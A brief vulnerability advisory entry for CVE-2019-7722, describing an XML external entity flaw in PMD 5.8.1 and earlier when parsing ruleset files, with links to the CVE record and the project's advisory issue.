* [reproducible-central](https://github.com/jvm-repo-rebuild/reproducible-central?tab=readme-ov-file#reproducible-builds-for-maven-central-repository)



### CVE-2019-7722
**Published:** 2019-02-11

**Description:**

PMD 5.8.1 and earlier processes XML external entities in ruleset files it parses as part of the analysis process,
allowing attackers tampering it (either by direct modification or MITM attacks when using remote rulesets)
to perform information disclosure, denial of service, or request forgery attacks. (PMD 6.x is unaffected
because of a 2017-09-15 change.)

**References:**
* [CVE-2019-7722](https://www.cve.org/CVERecord?id=CVE-2019-7722)
* [[core] Advisory - XXE attack on ruleset parsing #1650](https://github.com/pmd/pmd/issues/1650)
